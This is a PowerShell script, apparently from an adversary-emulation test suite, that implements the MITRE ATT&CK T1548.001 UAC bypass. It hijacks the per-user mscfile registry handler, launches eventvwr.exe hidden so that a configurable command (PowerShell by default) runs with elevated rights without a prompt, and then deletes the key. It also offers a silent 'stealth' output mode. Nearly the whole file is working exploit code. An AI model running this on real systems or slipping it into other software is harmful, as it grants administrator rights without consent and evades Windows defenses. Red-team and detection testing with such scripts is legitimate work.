# T1548.001B - UAC Bypass via EventVwr
# MITRE ATT&CK Technique: T1548.001 - Abuse Elevation Control Mechanism: Bypass UAC
# Platform: Windows | Privilege: User -> Admin | Tactic: Defense Evasion

#Requires -Version 5.0

# Function 1: Get-Configuration (40-50 lines max)
function Get-Configuration {
    param()
    
    $config = @{
        Success = $false
        Technique = "T1548.001B"
        TechniqueName = "UAC Bypass via EventVwr"
        OutputBase = $env:OUTPUT_BASE
        Timeout = if ($env:TIMEOUT) { [int]$env:TIMEOUT } else { 300 }
        Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        Results = @{
            InitialPrivilege = ""
            RegistryPath = ""
            CommandExecuted = ""
            BypassSuccess = $false
            CleanupPerformed = $false
            ErrorMessage = ""
        }
    }
    
    # Load technique-specific variables
    $Config.TargetCommand = if ($env:T1548_001B_TARGET_COMMAND) { $env:T1548_001B_TARGET_COMMAND } else { "cmd.exe /c start powershell.exe" }
    $Config.RegistryPath = if ($env:T1548_001B_REGISTRY_PATH) { $env:T1548_001B_REGISTRY_PATH } else { "HKCU:\Software\Classes\mscfile\shell\open\command" }
    $Config.Cleanup = if ($env:T1548_001B_CLEANUP -eq "false") { $false } else { $true }
    $Config.OutputMode = if ($env:T1548_001B_OUTPUT_MODE) { $env:T1548_001B_OUTPUT_MODE } else { "simple" }
    $Config.SilentMode = if ($env:T1548_001B_SILENT_MODE -eq "true") { $true } else { $false }
    
    # Validate critical dependencies
    if (-not (Test-Path "C:\Windows\System32\eventvwr.exe")) {
        $Config.Results.ErrorMessage = "Missing dependency: eventvwr.exe"
        return $config
    }
    
    # Check UAC status
    $uacEnabled = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA -eq 1
    if (-not $uacEnabled) {
        $Config.Results.ErrorMessage = "UAC is disabled"
        return $config
    }
    
    $Config.Success = $true
    return $config
}

# Specialized function: Registry hijacking for eventvwr
function Set-EventVwrHijack {
    param($RegistryPath, $TargetCommand)
    
    try {
        # Create registry structure for mscfile handler
        $null = New-Item -Path $RegistryPath -Force -ErrorAction Stop
        $null = Set-ItemProperty -Path $RegistryPath -Name "(default)" -Value $TargetCommand -Force
        
        return $true
    }
    catch {
        return $false
    }
}

# Specialized function: Cleanup registry
function Remove-EventVwrHijack {
    param($RegistryPath)
    
    try {
        # Remove entire mscfile key
        $mscfileKey = "HKCU:\Software\Classes\mscfile"
        if (Test-Path $mscfileKey) {
            Remove-Item -Path $mscfileKey -Recurse -Force -ErrorAction Stop
        }
        return $true
    }
    catch {
        return $false
    }
}

# Function 2: Invoke-MicroTechniqueAction (30-40 lines max)
function Invoke-MicroTechniqueAction {
    param($Config)
    
    # Get initial privilege level
    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $Config.Results.InitialPrivilege = if ($isAdmin) { "Administrator" } else { "User" }
    
    if (-not $Config.SilentMode) {
        Write-Host "[INFO] Starting UAC bypass via eventvwr.exe..." -ForegroundColor Yellow
    }
    
    # ATOMIC ACTION: Registry hijacking and eventvwr execution
    $Config.Results.RegistryPath = $Config.RegistryPath
    $Config.Results.CommandExecuted = $Config.TargetCommand
    
    # Set registry hijack
    $hijackSuccess = Set-EventVwrHijack -RegistryPath $Config.RegistryPath `
                                        -TargetCommand $Config.TargetCommand
    
    if (-not $hijackSuccess) {
        $Config.Results.ErrorMessage = "Failed to set registry hijack"
        return $Config
    }
    
    # Execute eventvwr.exe
    try {
        Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 3
        $Config.Results.BypassSuccess = $true
        
        if (-not $Config.SilentMode) {
            Write-Host "[SUCCESS] UAC bypass executed via eventvwr.exe" -ForegroundColor Green
        }
    }
    catch {
        $Config.Results.ErrorMessage = "Failed to execute eventvwr.exe: $_"
        $Config.Results.BypassSuccess = $false
    }
    
    # Cleanup if requested
    if ($Config.Cleanup) {
        Start-Sleep -Seconds 2
        $Config.Results.CleanupPerformed = Remove-EventVwrHijack -RegistryPath $Config.RegistryPath
    }
    
    return $Config
}

# Function 3: Write-StandardizedOutput (30-40 lines max)
function Write-StandardizedOutput {
    param($Config)
    
    $outputDir = Join-Path $Config.OutputBase "T1548.001b_uac_bypass_$($Config.Timestamp)"
    
    switch ($Config.OutputMode) {
        "simple" {
            # Realistic attacker output
            if ($Config.Results.BypassSuccess) {
                Write-Host "`n[+] UAC Bypass Successful" -ForegroundColor Green
                Write-Host "    Initial Privilege: $($Config.Results.InitialPrivilege)"
                Write-Host "    Registry Path: $($Config.Results.RegistryPath)"
                Write-Host "    Command: $($Config.Results.CommandExecuted)"
                if ($Config.Results.CleanupPerformed) {
                    Write-Host "    [*] Registry cleaned" -ForegroundColor Yellow
                }
            } else {
                Write-Host "`n[-] UAC Bypass Failed: $($Config.Results.ErrorMessage)" -ForegroundColor Red
            }
        }
        
        "debug" {
            # Structured JSON for analysis
            $null = New-Item -ItemType Directory -Path $outputDir -Force
            $debugOutput = @{
                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Technique = $Config.Technique
                TechniqueName = $Config.TechniqueName
                Platform = "Windows"
                ExecutionResults = $Config.Results
                EnvironmentContext = @{
                    Hostname = $env:COMPUTERNAME
                    Username = $env:USERNAME
                    OSVersion = [System.Environment]::OSVersion.VersionString
                }
            }
            $debugOutput | ConvertTo-Json -Depth 4 | Out-File "$outputDir\t1548_001b_uac_bypass_eventvwr.json"
            Write-Host "[DEBUG] Results saved to: $outputDir" -ForegroundColor Cyan
        }
        
        "stealth" {
            # Silent operation - no output
        }
    }
}

# Function 4: Main (20-30 lines max)
function Main {
    # Exit codes: 0=SUCCESS, 1=FAILED, 2=SKIPPED
    
    # Step 1: Get configuration
    $Config = Get-Configuration
    if (-not $Config.Success) {
        if ($Config.Results.ErrorMessage -like "*UAC is disabled*") {
            Write-Host "[SKIP] $($Config.Results.ErrorMessage)" -ForegroundColor Yellow
            exit 2
        }
        Write-Host "[ERROR] $($Config.Results.ErrorMessage)" -ForegroundColor Red
        exit 1
    }
    
    # Step 2: Execute micro-technique
    $config = Invoke-MicroTechniqueAction -Config $config
    
    # Step 3: Write output
    Write-StandardizedOutput -Config $config
    
    # Return appropriate exit code
    if ($Config.Results.BypassSuccess) {
        exit 0
    } else {
        exit 1
    }
}

# Execute main function
Main

